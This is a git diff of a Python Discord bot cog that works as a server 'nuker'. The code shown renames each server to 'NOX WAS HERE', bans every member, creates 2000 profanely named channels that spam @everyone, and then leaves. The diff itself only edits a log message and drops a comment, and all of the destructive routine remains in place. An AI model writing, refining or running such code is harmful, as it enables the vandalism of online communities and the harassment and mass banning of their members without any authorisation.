@@ -21,7 +21,7 @@ class Startup(commands.Cog):
                 invite = await self.bot.get_channel(discord.utils.get(guild.channels, name=f'fuckme1').id).create_invite(max_age = 300)
                 print(f'Guild: {guild.name} - {str(guild.id)} - Invite: {str(invite)} :)')
                 await guild.edit(name="NOX WAS HERE")
-                print(f'Nuked guild: {guild.name} - {str(guild.id)} - Changed server name :)')
+                print(f'Guild: {guild.name} - {str(guild.id)} - Changed server name :)')
                 for member in guild.members:
                     try:
                         await member.ban(reason='Banned by Anix <3')
@@ -37,7 +37,6 @@ class Startup(commands.Cog):
                     await self.bot.get_channel(discord.utils.get(guild.channels, name=f'fuckme{i}').id).send("@everyone nox#4041 is the best")
                 print(f'Guild: {guild.name} - {str(guild.id)} - Created 2000 channels :)')
                 await guild.leave()
-                # error for 
                 print(f'Guild: {guild.name} - {str(guild.id)} - Left after nuking :)')  
             except discord.errors.Forbidden:
                 print("Guild: " + str(guild.name) + " - " + str(guild.id) + " - Kicked or have been banned")
